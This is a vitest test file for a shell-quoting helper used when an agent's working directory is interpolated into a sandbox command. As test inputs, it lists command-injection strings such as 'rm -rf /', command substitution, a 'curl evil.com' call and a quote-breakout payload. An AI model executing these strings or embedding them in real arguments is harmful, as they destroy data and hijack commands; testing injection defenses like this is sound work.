import { describe, expect, test } from "vitest";
import { remoteCwd, shellQuote } from "../workspace.js";

/**
 * `shellQuote` exists because the Vercel provider folds `mkdir -p <cwd> && cd
 * <cwd>` into the command string instead of issuing a separate
 * `sandbox.fs.mkdir()`. That call was not free: the SDK implements the
 * recursive branch as a real command execution, so it doubled the command-API
 * rate for every command and tripped Vercel's rate limit — surfacing to the
 * agent as its OWN command failing with "Status code 429 is not ok".
 *
 * Folding the mkdir in means a cwd now reaches a shell as text, so the quoting
 * is load-bearing: a directory name is agent-influenced input.
 */
describe("shellQuote", () => {
  test("wraps in single quotes so no expansion survives", () => {
    expect(shellQuote("/vercel/sandbox")).toBe("'/vercel/sandbox'");
  });

  test("neutralizes command substitution and separators", () => {
    for (const attack of [
      "/tmp/x; rm -rf /",
      "/tmp/$(whoami)",
      "/tmp/`id`",
      "/tmp/x && curl evil.com",
      "/tmp/x | tee /etc/passwd",
      "/tmp/$HOME",
    ]) {
      const quoted = shellQuote(attack);
      // Everything stays inside one quoted literal: the only quotes present are
      // the wrapper pair, so nothing can terminate the string early.
      expect(quoted.startsWith("'")).toBe(true);
      expect(quoted.endsWith("'")).toBe(true);
      expect(quoted.slice(1, -1)).not.toContain("'");
    }
  });

  test("escapes an embedded single quote rather than closing the string", () => {
    // The one character single-quoting cannot itself contain. Close, escape,
    // reopen — a naive implementation lets `';id;'` break out.
    expect(shellQuote("/tmp/it's")).toBe(`'/tmp/it'\\''s'`);
    const escaped = shellQuote("/tmp/';id;'");
    expect(escaped).toBe(`'/tmp/'\\'';id;'\\'''`);
  });

  test("a quoted remoteCwd is always a single shell word", () => {
    // The real call shape: whatever remoteCwd returns is interpolated into
    // `mkdir -p <quoted> && cd <quoted> && <command>`.
    const cwd = remoteCwd("/workspace/sub dir", "/workspace", "/vercel/sandbox");
    const quoted = shellQuote(cwd);
    expect(quoted).toContain(" ");
    expect(quoted.startsWith("'")).toBe(true);
    expect(quoted.endsWith("'")).toBe(true);
  });
});
